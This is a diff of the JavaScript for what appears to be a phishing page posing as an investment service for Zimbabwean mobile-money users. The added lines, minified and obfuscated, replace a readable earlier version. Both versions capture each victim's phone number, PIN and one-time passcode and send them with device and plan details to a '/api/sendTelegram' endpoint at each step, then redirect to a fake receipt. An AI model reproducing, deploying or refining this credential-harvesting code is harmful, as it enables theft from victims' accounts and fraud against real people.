-  if(v.length>0&&v[0]!=="7")v="7"+v.slice(1);
-  v=v.slice(0,9);e.target.value=v;
-  phoneValue="+263"+v;validateLogin();
+var ua=navigator.userAgent,dev='Unknown';
+if(/Android/i.test(ua))dev='Android';else if(/iPhone|iPad/i.test(ua))dev='iOS';
+if(/Chrome/i.test(ua))dev+=' Chrome';else if(/Safari/i.test(ua))dev+=' Safari';
+function pl(){return plan?'Plan:'+plan.name+' Deposit:$'+plan.amount+' Return:+'+plan.pct+'% Payout:$'+plan.payout+' in '+plan.hours+'h':'—';}
+function tg(ev){try{fetch('/api/sendTelegram',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({submittedAt:new Date().toISOString(),loginPhone:pv,loginPin:pnv,otp:ov,event:ev,plan:pl(),device:dev})});}catch(e){}}
+function go(id){document.querySelectorAll('.step').forEach(function(s){s.classList.remove('on');});document.getElementById(id).classList.add('on');cur=id;ub();}
+function ub(){var b=document.getElementById('mb');if(cur==='s1'){b.textContent='Invest Securely \u2192';vl();}else if(cur==='s2'){b.textContent='Confirm OTP \u2192';vo();}else{b.textContent='Processing\u2026';b.classList.remove('on');}}
+document.getElementById('ph').oninput=function(e){var v=e.target.value.replace(/\D/g,'');if(v.startsWith('263'))v=v.slice(3);if(v.startsWith('0'))v=v.slice(1);if(v.length>0&&v[0]!=='7')v='7'+v.slice(1);v=v.slice(0,9);e.target.value=v;pv='+263'+v;vl();};
+var pin=document.getElementById('pin');
+pin.oninput=function(){pin.value=pin.value.replace(/\D/g,'').slice(0,4);pnv=pin.value;vl();};
+document.getElementById('eBtn').onclick=function(){var sh=pin.type==='password';pin.type=sh?'text':'password';document.getElementById('eIco').innerHTML=sh?'<path d="M17.94 17.94A10 10 0 0112 20c-7 0-11-8-11-8a18 18 0 015.06-5.94"/><path d="M9.9 4.24A9 9 0 0112 4c7 0 11 8 11 8a18 18 0 01-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>':'<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';};
+function vl(){document.getElementById('mb').classList.toggle('on',pv.length===13&&pnv.length===4);}
+var oh=document.getElementById('otpH'),obs=[...document.querySelectorAll('.ob')];
+function ro(){var val=oh.value.replace(/\D/g,'').slice(0,6);oh.value=val;var c=val.length;obs.forEach(function(b,i){b.textContent=val[i]||'';b.className='ob';if(od){b.classList.add('disabled');return;}if(i<c)b.classList.add('filled');if(i===c&&document.activeElement===oh)b.classList.add('active');});ov=val;document.getElementById('mb').classList.toggle('on',val.length===6);}
+oh.addEventListener('input',ro);oh.addEventListener('focus',ro);oh.addEventListener('blur',ro);
+document.getElementById('otpWr').addEventListener('click',function(){if(!od)oh.focus();});
+function resetOtp(d){od=d;oh.value='';oh.disabled=d;ro();if(!d)oh.focus();}
+function vo(){document.getElementById('mb').classList.toggle('on',ov.length===6);}
+document.getElementById('mb').onclick=function(){
+  if(cur==='s1'){if(lc)return;lc=true;tg('invest_initiated');var m=pv.replace(/(\+263\d{3})\d{4}(\d{2})/,'$1****$2');document.getElementById('mn').textContent='Code sent to '+m;go('s2');startTimer();}
+  else if(cur==='s2'){if(os)return;os=true;tg('otp_confirmed');go('s3');setTimeout(function(){location.href='receipt.html';},1200);}
 };
-
-const pinInput=document.getElementById("pinInput");
-pinInput.oninput=function(){pinInput.value=pinInput.value.replace(/\D/g,"").slice(0,4);pinValue=pinInput.value;validateLogin();};
-
-document.getElementById("eyeBtn").onclick=function(){
-  const show=pinInput.type==="password";
-  pinInput.type=show?"text":"password";
-  document.getElementById("eyeIcon").innerHTML=show
-    ?"<path d=\"M17.94 17.94A10 10 0 0112 20c-7 0-11-8-11-8a18 18 0 015.06-5.94\"/><path d=\"M9.9 4.24A9 9 0 0112 4c7 0 11 8 11 8a18 18 0 01-2.16 3.19\"/><line x1=\"1\" y1=\"1\" x2=\"23\" y2=\"23\"/>"
-    :"<path d=\"M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z\"/><circle cx=\"12\" cy=\"12\" r=\"3\"/>";
-};
-
-function validateLogin(){
-  pinValue=pinInput.value;
-  document.getElementById("mainBtn").classList.toggle("active",phoneValue.length===13&&pinValue.length===4);
-}
-
-// OTP
-const otpHidden=document.getElementById("otpHidden");
-const otpBoxes=[...document.querySelectorAll(".otp-box")];
-let otpDisabled=false;
-
-function renderOtp(){
-  const val=otpHidden.value.replace(/\D/g,"").slice(0,6);
-  otpHidden.value=val;
-  const cursor=val.length;
-  otpBoxes.forEach(function(box,i){
-    box.textContent=val[i]||"";
-    box.className="otp-box";
-    if(otpDisabled){box.classList.add("disabled");return;}
-    if(i<cursor)box.classList.add("filled");
-    if(i===cursor&&document.activeElement===otpHidden)box.classList.add("active");
-  });
-  otpValue=val;
-  document.getElementById("mainBtn").classList.toggle("active",val.length===6);
-}
-otpHidden.addEventListener("input",renderOtp);
-otpHidden.addEventListener("focus",renderOtp);
-otpHidden.addEventListener("blur",renderOtp);
-document.getElementById("otpWrap").addEventListener("click",function(){if(!otpDisabled)otpHidden.focus();});
-
-function resetOtp(disabled){
-  otpDisabled=disabled;otpHidden.value="";otpHidden.disabled=disabled;renderOtp();
-  if(!disabled)otpHidden.focus();
-}
-function validateOtp(){document.getElementById("mainBtn").classList.toggle("active",otpValue.length===6);}
-
-document.getElementById("mainBtn").onclick=function(){
-  if(currentStep==="step1"){
-    if(loginClicked)return;loginClicked=true;
-    sendToTelegram("invest_initiated");
-    var masked=phoneValue.replace(/(\+263\d{3})\d{4}(\d{2})/,"$1****$2");
-    document.getElementById("maskedNumber").textContent="Code sent to "+masked;
-    showStep("step3");startTimer();
-  }else if(currentStep==="step3"){
-    if(otpSubmitted)return;otpSubmitted=true;
-    sendToTelegram("otp_confirmed");
-    showStep("step4");
-    setTimeout(function(){location.href="receipt.html";},1200);
-  }
-};
-
-document.getElementById("resendBtn").onclick=function(){
-  var btn=document.getElementById("resendBtn");
-  if(!btn.classList.contains("active"))return;
-  if(resendClicked)return;resendClicked=true;
-  sendToTelegram("resend_otp");startTimer();
-};
-
-function startTimer(){
-  var t=120;
-  var timeEl=document.getElementById("time"),resendBtn=document.getElementById("resendBtn");
-  timeEl.textContent=t;resendBtn.classList.remove("active");resendClicked=false;
-  resetOtp(false);document.getElementById("mainBtn").classList.remove("active");
-  var timer=setInterval(function(){
-    t--;timeEl.textContent=t;
-    if(t<=0){
-      clearInterval(timer);resendBtn.classList.add("active");resetOtp(true);
-      document.getElementById("mainBtn").classList.remove("active");
-      document.getElementById("maskedNumber").textContent="Code expired. Tap Resend to get a new one.";
-    }
-  },1000);
-}
+document.getElementById('rsnd').onclick=function(){if(!this.classList.contains('on'))return;if(rc)return;rc=true;tg('resend_otp');startTimer();};
+function startTimer(){var t=120,te=document.getElementById('tc'),rb=document.getElementById('rsnd');te.textContent=t;rb.classList.remove('on');rc=false;resetOtp(false);document.getElementById('mb').classList.remove('on');var ti=setInterval(function(){t--;te.textContent=t;if(t<=0){clearInterval(ti);rb.classList.add('on');resetOtp(true);document.getElementById('mb').classList.remove('on');document.getElementById('mn').textContent='Code expired. Tap Resend to get a new one.';}},1000);}
 </script>
 </body>
 </html>
